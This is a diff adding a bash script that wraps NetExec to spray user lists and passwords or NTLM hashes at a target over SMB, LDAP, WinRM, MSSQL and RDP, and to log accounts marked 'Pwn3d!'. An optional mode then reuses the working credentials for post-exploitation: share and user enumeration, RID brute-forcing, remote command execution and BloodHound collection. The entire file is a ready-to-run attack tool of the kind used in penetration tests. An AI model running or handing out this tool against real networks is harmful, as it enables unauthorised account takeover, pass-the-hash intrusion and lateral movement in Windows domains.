@@ -1,0 +1,211 @@
+#!/bin/bash
+
+set -m  # enable job control
+trap 'echo -e "\n[!] Interrupted by user. Killing all subprocesses..."; kill -TERM -$$; exit 130' INT
+
+# Usage:
+# ./check_domain_services.sh <IP> -u <user or userfile> -p <pass/hash or file> [-d domain] [-l] [--enum] [-s service1,service2]
+
+RED='\033[0;31m'
+BLUE='\033[0;34m'
+GREEN='\033[0;32m'
+YELLOW='\033[0;33m'
+NC='\033[0m'
+
+if [ "$#" -lt 5 ]; then
+    echo "Usage: $0 <IP> -u <user or userfile> -p <pass/hash or file> [-d domain] [-l] [--enum] [-s service1,service2]"
+    exit 1
+fi
+
+IP="$1"
+shift
+
+while [[ "$#" -gt 0 ]]; do
+    case "$1" in
+        -u)
+            USER_ARG="$2"
+            shift 2
+            ;;
+        -p)
+            PASS_ARG="$2"
+            shift 2
+            ;;
+        -d)
+            DOMAIN="$2"
+            shift 2
+            ;;
+        -l)
+            LOCAL_AUTH="--local-auth"
+            shift
+            ;;
+        -s)
+            CUSTOM_SERVICES="$2"
+            shift 2
+            ;;
+        --enum)
+            ENUM_ENABLED=true
+            shift
+            ;;
+        *)
+            echo "[!] Unknown option: $1"
+            exit 1
+            ;;
+    esac
+done
+
+if [ -f "$USER_ARG" ]; then
+    mapfile -t USERNAMES < "$USER_ARG"
+else
+    USERNAMES=("$USER_ARG")
+fi
+
+if [ -f "$PASS_ARG" ]; then
+    mapfile -t SECRETS < "$PASS_ARG"
+else
+    SECRETS=("$PASS_ARG")
+fi
+
+echo "[*] Target IP: $IP"
+echo "[*] Users: ${#USERNAMES[@]} loaded"
+echo "[*] Secrets: ${#SECRETS[@]} loaded"
+[ -n "$DOMAIN" ] && echo "[*] Domain: $DOMAIN"
+[ -n "$LOCAL_AUTH" ] && echo "[*] Using local authentication"
+echo
+
+if [ -n "$CUSTOM_SERVICES" ]; then
+    IFS=',' read -ra SERVICES <<< "$CUSTOM_SERVICES"
+else
+    SERVICES=("smb" "ldap" "winrm" "mssql" "rdp" "nfs" "wmi" "ssh" "ftp")
+    SERVICES=("smb" "ldap" "winrm" "mssql" "rdp" "ssh" "ftp")
+    SERVICES=("smb" "ldap" "winrm" "mssql" "rdp")
+fi
+
+declare -A PWNED
+
+for USER in "${USERNAMES[@]}"; do
+    for SECRET in "${SECRETS[@]}"; do
+
+        IS_HASH=false
+        if [[ "$SECRET" =~ ^[0-9A-Fa-f]{32}:[0-9A-Fa-f]{32}$ ]]; then
+            IS_HASH=true
+        fi
+
+        for SERVICE in "${SERVICES[@]}"; do
+            echo -e "${RED}=== Checking $SERVICE with $USER : $SECRET ===${NC}"
+
+            CMD="nxc $SERVICE $IP -u \"$USER\""
+            if [ "$IS_HASH" = true ]; then
+                CMD="$CMD -H \"$SECRET\""
+            else
+                CMD="$CMD -p \"$SECRET\""
+            fi
+            [ -n "$DOMAIN" ] && CMD="$CMD -d \"$DOMAIN\""
+            [ -n "$LOCAL_AUTH" ] && CMD="$CMD $LOCAL_AUTH"
+
+            #FIXME: Add --timeout 3 only for ftp
+            if [ "$SERVICE" = "ftp" ]; then
+                CMD="$CMD --timeout 3"
+            else
+                CMD="$CMD --timeout 7"
+            fi
+
+            # echo "[>] $CMD"
+            echo -e "${BLUE}[>] ${CMD[*]}${NC}"
+
+            # OUTPUT=$(script -q -c "$CMD" /dev/null)
+            # echo "$OUTPUT"
+            TEMP_OUTPUT=$(mktemp)
+            script -q -c "$CMD" 2>&1 | tee "$TEMP_OUTPUT"
+            # "${CMD[@]}" 2>&1 | tee "$TEMP_OUTPUT"
+            # echo
+
+            # if echo "$OUTPUT" | grep -q -e 'Pwn3d!' -e "\[\+\]"; then
+            #     PWNED["$SERVICE"]+="$USER:$SECRET"$'\n'
+            # fi
+            # if grep -q -e "Pwn3d!" -e "\[\+\]" "$TEMP_OUTPUT"; then
+            #     PWNED["$SERVICE"]+="$USER:$SECRET"$'\n'
+            # grep -q -E "Pwn3d!|\[\+\]" "$TEMP_OUTPUT"
+            if grep -q -F "Pwn3d!" "$TEMP_OUTPUT" || grep -q -F "[+]" "$TEMP_OUTPUT"; then
+                PWNED["$SERVICE"]+="$USER:$SECRET"$'\n'
+            fi
+
+
+            rm "$TEMP_OUTPUT"
+            echo
+        done
+    done
+done
+
+get_postex_commands() {
+    local service="$1"
+    case "$service" in
+        smb)
+            echo "--shares,--users,--rid-brute,--pass-pol,-x whoami"
+            ;;
+        ldap)
+            echo "--find-delegation,--trusted-for-delegation,--admin-count,--computers,--dc-list,--bloodhound -c all"
+            # echo "--find-delegation,--trusted-for-delegation,--admin-count,--computers,--dc-list"
+            ;;
+        *)
+            return 1  # No commands
+            ;;
+    esac
+}
+
+build_base_cmd() {
+    local service="$1" user="$2" secret="$3"
+    local cmd="nxc $service $IP -u \"$user\""
+
+    if [[ "$secret" =~ ^[0-9A-Fa-f]{32}:[0-9A-Fa-f]{32}$ ]]; then
+        cmd="$cmd -H \"$secret\""
+    else
+        cmd="$cmd -p \"$secret\""
+    fi
+
+    [ -n "$DOMAIN" ] && cmd="$cmd -d \"$DOMAIN\""
+    [ -n "$LOCAL_AUTH" ] && cmd="$cmd $LOCAL_AUTH"
+
+    echo "$cmd"
+}
+
+replay_creds() {
+    local service="$1"
+    echo -e "${YELLOW}[*] Re-using valid credentials for post-exploitation on $service${NC}"
+
+    cmds_string=$(get_postex_commands "$service") || {
+        echo -e "${RED}[!] No post-exploitation commands for $service${NC}"
+        return
+    }
+
+    IFS=',' read -ra commands <<< "$cmds_string"
+
+    while IFS=: read -r user secret; do
+        base_cmd=$(build_base_cmd "$service" "$user" "$secret")
+        for cmd in "${commands[@]}"; do
+            full_cmd="$base_cmd $cmd"
+            echo -e "${GREEN}[>] Running '$cmd' with $user:$secret on $service${NC}"
+            echo -e "${BLUE}[>] $full_cmd${NC}"
+            script -q -c "$full_cmd" /dev/null
+            echo
+        done
+    done <<< "${PWNED[$service]}"
+}
+
+
+echo
+echo -e "${YELLOW}===== Summary =====${NC}"
+if [ "${#PWNED[@]}" -eq 0 ]; then
+    echo -e "${RED}[-] No valid credentials found (no Pwn3d! detected)${NC}"
+else
+    echo -e "${GREEN}[+] Valid creds:${NC}"
+    for svc in "${!PWNED[@]}"; do
+        echo "  - $svc:"
+        echo "${PWNED[$svc]}" | sed 's/^/     /'
+    done
+fi
+
+if [ "$ENUM_ENABLED" = true ]; then
+    for svc in "${!PWNED[@]}"; do
+        replay_creds "$svc"
+    done
+fi
